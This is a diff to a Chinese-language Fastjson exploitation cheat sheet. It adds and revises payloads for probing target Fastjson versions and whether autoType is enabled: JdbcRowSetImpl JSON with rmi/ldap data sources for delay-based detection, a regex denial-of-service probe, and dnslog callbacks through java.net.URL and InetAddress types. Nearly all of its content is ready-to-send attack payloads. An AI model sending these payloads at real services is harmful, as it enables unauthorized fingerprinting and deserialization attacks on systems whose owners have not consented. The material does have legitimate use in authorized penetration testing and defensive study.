@@ -22,27 +22,80 @@ Fastjson姿势技巧集合
 
 ## 探测
 
-用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。   
-fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。   
+### 延迟探测
 
-主要是利用各个类被加入黑名单的方式进行判断   
+原理同ssrf漏洞。请求本机已开放端口不延时，请求不开放的端口则延时。
+fastjson 1.1.15-1.2.24
+
+```
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
+```
+通用payload,可用于parseObject的场景
+```
+{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:8088/badClassName", "autoCommit":true}}""}
+```
+fastjson 1.2.9-1.2.47
+```
+{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://localhost:808/badNameClass",
+        "autoCommit":true
+    }
+}
+```
+通用payload,可用于parseObject的场景
+```
+{"@type":"com.alibaba.fastjson.JSONObject",{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://localhost:8088/badNameClass",
+        "autoCommit":true
+    }
+}}""}
+
+```
+
+Fastjson 1.2.36 - 1.2.62
+利用正则dos洞，进行探测。逐步加a,直到延迟为止
+```
+{
+    "regex":{
+        "$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"
+    },
+    "blue":"aaaaaaaaaaaa!"
+}
+```
+参考https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA
+ 
+### dns探测
+
+主要是利用各个类被加入黑名单的方式进行判断，准确性不高   
 
 原理重点关注MiscCodec处理时会去nwe URL，然后通过后面的map#put触发计算key的hash。学习urldns链容易理解。   
 
-fastjson >1.2.43
+fastjson <1.2.43
 
 ```java
 {"@type":"java.net.URL","val":"http://dnslog"}
 {{"@type":"java.net.URL","val":"http://dnslog"}:"x"}
 ```
 
-fastjson >1.2.48
+fastjson <1.2.48
 
 ```java
 {"@type":"java.net.InetAddress","val":"dnslog"}
 ```
 
-fastjson >1.2.68
+fastjson <1.2.68
 
 ```java
 {"@type":"java.net.Inet4Address","val":"dnslog"}
@@ -55,7 +108,7 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 {{"@type":"java.net.URL","val":"http://dnslog"}:0
 ```
 
-精确探索
+精确探索autoType是否开启，开启后能打更多payload
 https://github.com/pen4uin/awesome-java-security/tree/main/alibaba%20fastjson
 ```
 [{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"ydk3cz.dnslog.cn"}]
